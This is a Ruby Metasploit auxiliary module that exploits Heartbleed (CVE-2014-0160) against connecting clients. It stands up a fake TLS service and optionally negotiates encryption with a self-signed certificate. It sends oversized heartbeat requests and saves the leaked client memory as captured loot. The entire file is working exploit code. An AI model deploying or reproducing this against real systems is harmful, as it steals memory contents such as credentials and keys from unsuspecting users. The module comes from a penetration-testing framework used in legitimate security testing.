##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'OpenSSL Heartbeat (Heartbleed) Client Memory Exposure',
      'Description'    => %q{
        This module provides a fake SSL service that is intended to
        leak memory from client systems as they connect. This module is
        hardcoded for using the AES-128-CBC-SHA1 cipher.
      },
      'Author'         =>
        [
          'Neel Mehta', # Vulnerability discovery
          'Riku', # Vulnerability discovery
          'Antti', # Vulnerability discovery
          'Matti', # Vulnerability discovery
          'hdm' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Actions'        => [['Capture']],
      'PassiveActions' => ['Capture'],
      'DefaultAction'  => 'Capture',
      'References'     =>
        [
          [ 'CVE', '2014-0160' ],
          [ 'US-CERT-VU', '720951' ],
          [ 'URL', 'https://www.us-cert.gov/ncas/alerts/TA14-098A' ],
          [ 'URL', 'http://heartbleed.com/' ]
        ],
      'DisclosureDate' => 'Apr 07 2014',
      'Notes' =>
          {
              'AKA' => ['Heartbleed']
          }

    )

    register_options(
      [
        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 8443 ]),
        OptInt.new('HEARTBEAT_LIMIT', [true, "The number of kilobytes of data to capture at most from each client", 512]),
        OptInt.new('HEARTBEAT_READ', [true, "The number of bytes to leak in the heartbeat response", 65535]),
        OptBool.new('NEGOTIATE_TLS', [true, "Set this to true to negotiate TLS and often leak more data at the cost of CA validation", false])
      ])
  end

  # Initialize the client state and RSA key for this session
  def setup
    super
    @state    = {}
    @cert_key = OpenSSL::PKey::RSA.new(1024){ } if negotiate_tls?
  end

  # Setup the server module and start handling requests
  def run
    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit
  end

  # Determine how much memory to leak with each request
  def heartbeat_read_size
    datastore['HEARTBEAT_READ'].to_i
  end

  # Determine how much heartbeat data to capture at the most
  def heartbeat_limit
    datastore['HEARTBEAT_LIMIT'].to_i * 1024
  end

  # Determine whether we should negotiate TLS or not
  def negotiate_tls?
    !! datastore['NEGOTIATE_TLS']
  end

  # Initialize a new state for every client
  def on_client_connect(c)
    @state[c] = {
      :name          => "#{c.peerhost}:#{c.peerport}",
      :ip            => c.peerhost,
      :port          => c.peerport,
      :heartbeats    => "",
      :server_random => [Time.now.to_i].pack("N") + Rex::Text.rand_text(28)
    }
    print_status("#{@state[c][:name]} Connected")
  end

  # Buffer messages and parse them once they are fully received
  def on_client_data(c)
    data = c.get_once
    return if not data
    @state[c][:buff] ||= ""
    @state[c][:buff] << data
    process_request(c)
  end

  # Extract TLS messages from the buffer and process them
  def process_request(c)

    # Make this slightly harder to DoS
    if @state[c][:buff].to_s.length > (1024*128)
      print_status("#{@state[c][:name]} Buffer limit reached, dropping connection")
      c.close
      return
    end

    # Process any buffered messages
    loop do
      break unless @state[c][:buff]

      message_type, message_ver, message_len = @state[c][:buff].unpack("Cnn")
      break unless message_len
      break unless @state[c][:buff].length >= message_len+5

      mesg = @state[c][:buff].slice!(0, message_len+5)

      if @state[c][:encrypted]
        process_openssl_encrypted_request(c, mesg)
      else
        process_openssl_cleartext_request(c, mesg)
      end
    end
  end

  # Process cleartext TLS messages
  def process_openssl_cleartext_request(c, data)
    message_type, message_version, protocol_version = data.unpack("Cn@9n")

    if message_type == 0x15 and data.length >= 7
      message_level, message_reason = data[5,2].unpack("CC")
      print_status("#{@state[c][:name]} Alert Level #{message_level} Reason #{message_reason}")
      if message_level == 2 and message_reason == 0x30
        print_status("#{@state[c][:name]} Client rejected our certificate due to unknown CA")
        return
      end

      if level == 2
        print_status("#{@state[c][:name]} Client rejected our connection with a fatal error: #{message_reason}")
        return
      end

    end

    unless message_type == 0x18
      message_code = data[5,1].to_s.unpack("C").first
      vprint_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", message_type, message_version, message_code)}")
    end

    # Process the Client Hello
    unless @state[c][:received_hello]

      unless (message_type == 0x16 and data.length > 43 and message_code == 0x01)
        print_status("#{@state[c][:name]} Expected a Client Hello, received #{sprintf("type %.2x code %.2x", message_type, message_code)}")
        return
      end

      print_status("#{@state[c][:name]} Processing Client Hello...")

      # Extract the client_random needed to compute the master key
      @state[c][:client_random]  = data[11,32]
      @state[c][:received_hello] = true

      print_status("#{@state[c][:name]} Sending Server Hello...")
      openssl_send_server_hello(c, data, protocol_version)
      return
    end

    # If we are negotiating TLS, handle Client Key Exchange/Change Cipher Spec
    if negotiate_tls?
      # Process the Client Key Exchange
      if message_type == 0x16 and data.length > 11 and message_code == 0x10
        print_status("#{@state[c][:name]} Processing Client Key Exchange...")
        premaster_length = data[9, 2].unpack("n").first

        # Extract the pre-master secret in encrypted form
        if data.length >= 11 + premaster_length
          premaster_encrypted = data[11, premaster_length]

          # Decrypt the pre-master secret using our RSA key
          premaster_clear = @cert_key.private_decrypt(premaster_encrypted) rescue nil
          @state[c][:premaster] = premaster_clear if premaster_clear
        end
      end

      # Process the Change Cipher Spec and switch to encrypted communications
      if message_type == 0x14 and message_code == 0x01
        print_status("#{@state[c][:name]} Processing Change Cipher Spec...")
        initialize_encryption_keys(c)
        return
      end
    # Otherwise just start capturing heartbeats in clear-text mode
    else
      # Send heartbeat requests
      if @state[c][:heartbeats].length < heartbeat_limit
        openssl_send_heartbeat(c, protocol_version)
      end

      # Process cleartext heartbeat replies
      if message_type == 0x18
        vprint_status("#{@state[c][:name]} Heartbeat received (#{data.length-5} bytes) [#{@state[c][:heartbeats].length} bytes total]")
        @state[c][:heartbeats] << data[5, data.length-5]
      end

      # Full up on heartbeats, disconnect the client
      if @state[c][:heartbeats].length >= heartbeat_limit
        print_status("#{@state[c][:name]} Heartbeats received [#{@state[c][:heartbeats].length} bytes total]")
        store_captured_heartbeats(c)
        c.close()
      end
    end
  end

  # Process encrypted TLS messages
  def process_openssl_encrypted_request(c, data)
    message_type, message_version, protocol_version = data.unpack("Cn@9n")

    return if @state[c][:shutdown]
    return unless data.length > 5

    buff = decrypt_data(c, data[5, data.length-5])
    unless buff
      print_error("#{@state[c][:name]} Failed to decrypt, giving up on this client")
      c.close
      return
    end

    message_code = buff[0,1].to_s.unpack("C").first
    vprint_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", message_type, message_version, message_code)}")

    if message_type == 0x16
      print_status("#{@state[c][:name]} Processing Client Finished...")
    end

    # Send heartbeat requests
    if @state[c][:heartbeats].length < heartbeat_limit
      openssl_send_heartbeat(c, protocol_version)
    end

    # Process heartbeat replies
    if message_type == 0x18
      vprint_status("#{@state[c][:name]} Encrypted heartbeat received (#{buff.length} bytes) [#{@state[c][:heartbeats].length} bytes total]")
      @state[c][:heartbeats] << buff
    end

    # Full up on heartbeats, disconnect the client
    if @state[c][:heartbeats].length >= heartbeat_limit
      print_status("#{@state[c][:name]} Encrypted heartbeats received [#{@state[c][:heartbeats].length} bytes total]")
      store_captured_heartbeats(c)
      c.close()
    end
  end

  # Dump captured memory to a file on disk using the loot API
  def store_captured_heartbeats(c)
    if @state[c][:heartbeats].length > 0
      begin
        path = store_loot(
          "openssl.heartbleed.client",
          "application/octet-stream",
          @state[c][:ip],
          @state[c][:heartbeats],
          nil,
          "OpenSSL Heartbleed client memory"
        )
        print_good("#{@state[c][:name]} Heartbeat data stored in #{path}")
      rescue ::Interrupt
        raise $!
      rescue ::Exception
        print_error("#{@state[c][:name]} Heartbeat data could not be stored: #{$!.class} #{$!}")
      end

      # Report the memory disclosure as a vulnerability on the host
      report_vuln({
        :host => @state[c][:ip],
        :name => self.name,
        :info => "Module #{self.fullname} successfully dumped client memory contents",
        :refs => self.references,
        :exploited_at => Time.now.utc
      }) rescue nil # Squash errors related to ip => 127.0.0.1 and the like
    end

    # Clear the heartbeat array
    @state[c][:heartbeats] = ""
    @state[c][:shutdown] = true
  end

  # Delete the state on connection close
  def on_client_close(c)
    # Do we have any pending heartbeats to save?
    if @state[c][:heartbeats].length > 0
      store_captured_heartbeats(c)
    end
    @state.delete(c)
  end

  # Send an OpenSSL Server Hello response
  def openssl_send_server_hello(c, hello, version)

    # If encrypted, use the TLS_RSA_WITH_AES_128_CBC_SHA; otherwise, use the
    # first cipher suite sent by the client.
    if @state[c][:encrypted]
      cipher = "\x00\x2F"
    else
      cipher = hello[46, 2]
    end

    # Create the Server Hello response
    extensions =
      "\x00\x0f\x00\x01\x01"       # Heartbeat

    server_hello_payload =
      [version].pack('n') +        # Use the protocol version sent by the client.
      @state[c][:server_random] +  # Random (Timestamp + Random Bytes)
      "\x00" +                     # Session ID
      cipher +                     # Cipher ID (TLS_RSA_WITH_AES_128_CBC_SHA)
      "\x00" +                     # Compression Method (none)
      [extensions.length].pack('n') + extensions

    server_hello = [0x02].pack("C") + [ server_hello_payload.length ].pack("N")[1,3] + server_hello_payload

    msg1 = "\x16" + [version].pack('n') + [server_hello.length].pack("n") + server_hello
    c.put(msg1)

    # Skip the rest of TLS if we arent negotiating it
    unless negotiate_tls?
      # Send a heartbeat request to start the stream and return
      openssl_send_heartbeat(c, version)
      return
    end

    # Certificates
    certs_combined = generate_certificates
    pay2 = "\x0b" + [ certs_combined.length + 3 ].pack("N")[1, 3] + [ certs_combined.length ].pack("N")[1, 3] + certs_combined
    msg2 = "\x16" + [version].pack('n') + [pay2.length].pack("n") + pay2
    c.put(msg2)

    # End of Server Hello
    pay3 = "\x0e\x00\x00\x00"
    msg3 = "\x16" + [version].pack('n') + [pay3.length].pack("n") + pay3
    c.put(msg3)
  end

  # Send the heartbeat request that results in memory exposure
  def openssl_send_heartbeat(c, version)
    c.put "\x18" + [version].pack('n') + "\x00\x03\x01" + [heartbeat_read_size].pack("n")
  end

  # Pack the certificates for use in the TLS reply
  def generate_certificates
    certs = []
    certs << generate_certificate.to_der
    certs_combined = certs.map { |cert| [ cert.length ].pack("N")[1, 3] + cert }.join
  end

  # Generate a self-signed certificate to use for the service
  def generate_certificate
    key  = @cert_key
    cert = OpenSSL::X509::Certificate.new
    cert.version = 2
    cert.serial  = rand(0xFFFFFFFF)

    subject_cn = Rex::Text.rand_hostname
    subject = OpenSSL::X509::Name.new([
        ["C","US"],
        ['ST', Rex::Text.rand_state()],
        ["L", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
        ["O", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
        ["CN", subject_cn],
      ])
    issuer = OpenSSL::X509::Name.new([
        ["C","US"],
        ['ST', Rex::Text.rand_state()],
        ["L", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
        ["O", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
        ["CN", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
      ])

    cert.subject = subject
    cert.issuer = issuer
    cert.not_before = Time.now - (3600 * 24 * 365) + rand(3600 * 14)
    cert.not_after = Time.now + (3600 * 24 * 365) + rand(3600 * 14)
    cert.public_key = key.public_key
    ef = OpenSSL::X509::ExtensionFactory.new(nil,cert)
    cert.extensions = [
      ef.create_extension("basicConstraints","CA:FALSE"),
      ef.create_extension("subjectKeyIdentifier","hash"),
      ef.create_extension("extendedKeyUsage","serverAuth"),
      ef.create_extension("keyUsage","keyEncipherment,dataEncipherment,digitalSignature")
    ]
    ef.issuer_certificate = cert
    cert.add_extension ef.create_extension("authorityKeyIdentifier", "keyid:always,issuer:always")
    cert.sign(key, OpenSSL::Digest::SHA1.new)
    cert
  end

  # Decrypt the TLS message and return the result without the MAC
  def decrypt_data(c, data)
    return unless @state[c][:client_enc]

    cipher = @state[c][:client_enc]

    begin
      buff = cipher.update(data)
      buff << cipher.final

      # Trim the trailing MAC signature off the buffer
      if buff.length >= 20
        return buff[0, buff.length-20]
      end
    rescue ::OpenSSL::Cipher::CipherError => e
      print_error("#{@state[c][:name]} Decryption failed: #{e}")
    end

    nil
  end

  # Calculate keys and toggle encrypted status
  def initialize_encryption_keys(c)
    tls1_calculate_crypto_keys(c)
    @state[c][:encrypted] = true
  end

  # Determine crypto keys for AES-128-CBC based on the master secret
  def tls1_calculate_crypto_keys(c)
    @state[c][:master] = tls1_calculate_master_key(c)
    return unless @state[c][:master]

    key_block = tls1_prf(
      @state[c][:master],
      "key expansion" +  @state[c][:server_random] + @state[c][:client_random],
      (20 * 2) + (16 * 4)
    )

    # Extract the MAC, encryption, and IV from the keyblock
    @state[c].update({
      :client_write_mac_key => key_block.slice!(0, 20),
      :server_write_mac_key => key_block.slice!(0, 20),
      :client_write_key     => key_block.slice!(0, 16),
      :server_write_key     => key_block.slice!(0, 16),
      :client_iv            => key_block.slice!(0, 16),
      :server_iv            => key_block.slice!(0, 16),
    })

    client_cipher = OpenSSL::Cipher.new('aes-128-cbc')
    client_cipher.key = @state[c][:client_write_key]
    client_cipher.iv  = @state[c][:client_iv]
    client_cipher.decrypt
    client_mac = OpenSSL::HMAC.new(@state[c][:client_write_mac_key], OpenSSL::Digest.new('sha1'))

    server_cipher = OpenSSL::Cipher.new('aes-128-cbc')
    server_cipher.key = @state[c][:server_write_key]
    server_cipher.iv  = @state[c][:server_iv]
    server_cipher.encrypt
    server_mac = OpenSSL::HMAC.new(@state[c][:server_write_mac_key], OpenSSL::Digest.new('sha1'))

    @state[c].update({
      :client_enc => client_cipher,
      :client_mac => client_mac,
      :server_enc => server_cipher,
      :server_mac => server_mac
    })

    true
  end

  # Determine the master key from the premaster and client/server randoms
  def tls1_calculate_master_key(c)
    return unless (
      @state[c][:premaster]     and
      @state[c][:client_random] and
      @state[c][:server_random]
    )
    tls1_prf(
      @state[c][:premaster],
      "master secret" + @state[c][:client_random] + @state[c][:server_random],
      48
    )
  end

  # Random generator used to calculate key data for TLS 1.0/1.1
  def tls1_prf(input_secret, input_label, output_length)
    # Calculate S1 and S2 as even blocks of each half of the secret
    # string. If the blocks are uneven, then S1's last byte should
    # be duplicated by S2's first byte
    blen = (input_secret.length / 2.0).ceil
    s1 = input_secret[0, blen]
    s2_index = blen
    if input_secret.length % 2 != 0
      s2_index -= 1
    end
    s2 = input_secret[s2_index, blen]

    # Hash the first part with MD5
    out1 = tls1_p_hash('md5', s1, input_label, output_length).unpack("C*")

    # Hash the second part with SHA1
    out2 = tls1_p_hash('sha1', s2, input_label, output_length).unpack("C*")

    # XOR the results together
    [*(0..out1.length-1)].map {|i| out1[i] ^ out2[i] }.pack("C*")
  end

  # Used by tls1_prf to generate arbitrary amounts of session key data
  def tls1_p_hash(digest, secret, label, olen)
    output  = ""
    chunk   = OpenSSL::Digest.new(digest).digest_length
    ctx     = OpenSSL::HMAC.new(secret, OpenSSL::Digest.new(digest))
    ctx_tmp = OpenSSL::HMAC.new(secret, OpenSSL::Digest.new(digest))

    ctx.update(label)
    a1 = ctx.digest

    loop do
      ctx = OpenSSL::HMAC.new(secret, OpenSSL::Digest.new(digest))
      ctx_tmp = OpenSSL::HMAC.new(secret, OpenSSL::Digest.new(digest))
      ctx.update(a1)
      ctx_tmp.update(a1)
      ctx.update(label)

      if olen > chunk
        output << ctx.digest
        a1 = ctx_tmp.digest
        olen -= chunk
      else
        a1 = ctx.digest
        output << a1[0, olen]
        break
      end
    end

    output
  end
end
